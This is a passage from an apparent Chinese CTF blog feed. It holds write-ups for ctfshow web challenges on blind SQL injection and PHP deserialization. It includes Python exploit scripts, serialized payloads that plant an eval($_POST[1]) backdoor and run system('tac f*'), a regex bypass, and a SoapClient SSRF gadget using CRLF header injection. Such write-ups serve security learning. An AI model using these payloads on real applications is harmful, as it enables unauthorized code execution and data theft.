class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>data = &#123;<br>    <span class="hljs-string">&quot;tableName&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><br>url = <span class="hljs-string">&quot;http://0babbf0e-c396-4ff4-84a4-596bc4804893.challenge.ctf.show/select-waf.php&quot;</span><br><br>flag = <span class="hljs-string">&quot;&quot;</span><br>flag_list = <span class="hljs-string">&#x27;qwertyuiopasdfghjklzxcvbnm0123456789-_&#125;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_list:<br>        payload = <span class="hljs-string">&quot;(ctfshow_user)where((pass)like&#x27;%&#123;&#125;%&#x27;)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span> + flag + i)<br>        data[<span class="hljs-string">&#x27;tableName&#x27;</span>] = payload<br>        <br>        r = requests.post(url=url,data=data)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;$user_count = 1;&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag += i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><h3 id="web184">web184—</h3>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctfshow</tag>
      
      <tag>web</tag>
      
      <tag>wp</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-反序列化-wp</title>
    <link href="/2022/04/13/blog0014-ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/"/>
    <url>/2022/04/13/blog0014-ctfshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-wp/</url>
    
    <content type="html"><![CDATA[<p>反序列化开始，这次题有点多，我先把基础知识做了吧，框架审计那一块可能等暑假认真搞一下web开发再说吧。</p><p>魔术方法总结：</p><p>https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8B%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/#PHP%E5%B8%B8%E8%A7%81%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</p><span id="more"></span><p>参考链接：</p><p>https://tari.moe/2021/04/06/ctfshow-unserialize/</p><h3 id="web254">web254</h3><p>一个铺垫，和反序列化关系不大，只是一个简单的校验</p><h3 id="web255">web255</h3><p>做了一个校验，在Cookie中传入数据，反序列化验证。代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$var</span>)).<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="web256">web256</h3><p>这次新增了一个代码逻辑的过滤，没什么意义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$var</span>)).<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>附一个Python脚本，刷题的时候一直抓包还是烦的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote，urlencode<br><br><br>url = <span class="hljs-string">&quot;http://af5613f8-a7e0-4b48-8956-7f4e60881c08.challenge.ctf.show/&quot;</span><br><br>query = <span class="hljs-string">&quot;?username=123456&amp;password=654321&quot;</span><br><br>payload = <span class="hljs-string">r&quot;O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22123456%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22654321%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D&quot;</span><br>cookies = &#123;<br>    <span class="hljs-string">&quot;user&quot;</span>:payload<br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>r = requests.get(url=url + query,cookies=cookies,proxies=proxies)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="web257简单pop链">web257（简单pop链）</h3><p>有点<code>pop</code>的味道，但是还是很简单。</p><p>不过主要就是一点，我们在做反序列化时，对于私有属性的变量，可能存在不可见字符，所以最好还是<code>url</code>或者<code>base</code>编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$class</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;eval($_POST[1]);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$var</span>));<br></code></pre></td></tr></table></figure><p>附上Python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><br><br>url = <span class="hljs-string">&quot;http://c3b6867d-d297-4a8e-8b01-2eb5c16a7d3a.challenge.ctf.show/&quot;</span><br><br>query = <span class="hljs-string">&quot;?username=xxxxxx&amp;password=xxxxxx&quot;</span><br><br>payload = <span class="hljs-string">r&quot;O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D&quot;</span><br><br>cookies = &#123;<br>    <span class="hljs-string">&quot;user&quot;</span>:payload<br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span><br>&#125;<br><br>r = requests.post(url=url + query,cookies=cookies,data=data,proxies=proxies)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="web258反序列化绕过正则">web258（反序列化绕过正则）</h3><p>这道题有点怪，要反序列化，但是却ban对象类型。</p><p>这里涉及的一个点，就是低版本的PHP（如5.6）可能会在属性的数量值上支持正号。</p><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>= <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class=<span class="hljs-keyword">new</span> backDoor();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;class-&gt;getInfo();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;come back!\n&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backDoor</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;eval($_POST[1]);&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br><br><span class="hljs-variable">$wish</span> = serialize(<span class="hljs-variable">$var</span>);<br>preg_match_all(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="hljs-variable">$wish</span>,<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">2</span>; <span class="hljs-variable">$i</span>+=<span class="hljs-number">1</span>)<br>&#123;<br>    <span class="hljs-variable">$split</span> = explode(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$dir</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$i</span>]);<br>    <span class="hljs-variable">$wish</span> = preg_replace(<span class="hljs-string">&#x27;/[oc]:&#x27;</span>.<span class="hljs-variable">$split</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&#x27;:/i&#x27;</span>,<span class="hljs-string">&quot;O:+&quot;</span>.<span class="hljs-variable">$split</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-variable">$wish</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$wish</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>Python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote,urlencode<br><br><br>url = <span class="hljs-string">&quot;http://af26f1b2-7cd9-49c3-919d-480539e83a9a.challenge.ctf.show/&quot;</span><br><br>query = <span class="hljs-string">&quot;?username=xxxxxx&amp;password=xxxxxx&quot;</span><br><br>payload = <span class="hljs-string">r&quot;O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D&quot;</span><br><br>cookies = &#123;<br>    <span class="hljs-string">&quot;user&quot;</span>:payload<br>&#125;<br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;system(&#x27;tac f*&#x27;);&quot;</span><br>&#125;<br><br>r = requests.post(url=url + query,cookies=cookies,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="web259php原生类构造ssrf">web259（PHP原生类构造SSRF）</h3><p>这道题非常有意思，咋一看<code>index.php</code>不大理解到底在干什么。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$vip</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]);<br><br><span class="hljs-variable">$vip</span>-&gt;getFlag();<br></code></pre></td></tr></table></figure><p>也给了<code>flag.php</code>的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$xff</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>array_pop(<span class="hljs-variable">$xff</span>);<br><span class="hljs-variable">$ip</span> = array_pop(<span class="hljs-variable">$xff</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!==<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>==<span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>file_put_contents(<span class="hljs-string">&#x27;flag.txt&#x27;</span>,<span class="hljs-variable">$flag</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反手打一个<code>xff</code>进去，但是并没有什么效果，看来它会检查真实<code>ip</code>。于是我们只能尝试看看有没有<code>SSRF</code>漏洞了。</p><p>这里引入一个PHP原生类<code>SoapClient</code>，这个类的<code>__call()</code>方法会发起一个<code>post</code>请求，于是我们构造这样一个反序列化序列。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//我们需要注意的是，我们这里其实是利用User-Agent头的信息，覆盖后续的HTTP报文头信息（\r\n不能少），由于存在Code-Length这一项，我们post之后的内容会被丢弃。</span><br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;token=ctfshow&#x27;</span>;<br><br>    <span class="hljs-variable">$soap</span> = <span class="hljs-keyword">new</span> SoapClient(<br>        <span class="hljs-literal">null</span>, <br>        <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;uri&#x27;</span>=&gt; <span class="hljs-string">&quot;http://127.0.0.1/flag.php&quot;</span>,<br>            <span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<br>            <span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&quot;edge\r\nX-Forwarded-For:127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded&quot;</span>.<span class="hljs-string">&quot;\r\nContent-Length: &quot;</span>.(<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&quot;\r\n\r\n&quot;</span>.<span class="hljs-variable">$post_string</span>,<br>        )<br>    );<br><br>    <span class="hljs-keyword">echo</span>(urlencode(serialize(<span class="hljs-variable">$soap</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>打进去之后，就解决了这些问题。</p><h3 id="web260">web260</h3><p>简单正则匹配，没看懂在干什么。</p><h3 id="web261__unserialize-魔术方法">web261（__unserialize() 魔术方法）</h3><p>这也是一个PHP版本问题的点</p><p>官方链接附上：</p><p>https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowvip</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username!=<span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-keyword">$this</span>-&gt;password!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-keyword">$this</span>-&gt;password=<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-keyword">$this</span>-&gt;code = <span class="hljs-keyword">$this</span>-&gt;username.<span class="hljs-keyword">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;code==<span class="hljs-number">0x36d</span>)&#123;<br>            file_put_contents(<span class="hljs-keyword">$this</span>-&gt;username, <span class="hljs-keyword">$this</span>-&gt;password);<br>        &#125;<br>    &#125;<br>&#125;<br><br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;vip&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>当<code>__wakeup()</code>和<code>__unserialize()</code>同时出现时，前者会被覆盖。</p><p>那 <code>__unserialize()</code>的参数是哪里来的呢，其实是<code>unserialize()</code>先解析好了，再传参数给<code>__unserialize()</code>，所以这个<code>data</code>参数本身不影响。</p><p>再接下来的就是常规套路了，<code>php</code>数字比较这种东西没什么好说的了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$var</span> = <span class="hljs-keyword">new</span> ctfshowvip(<span 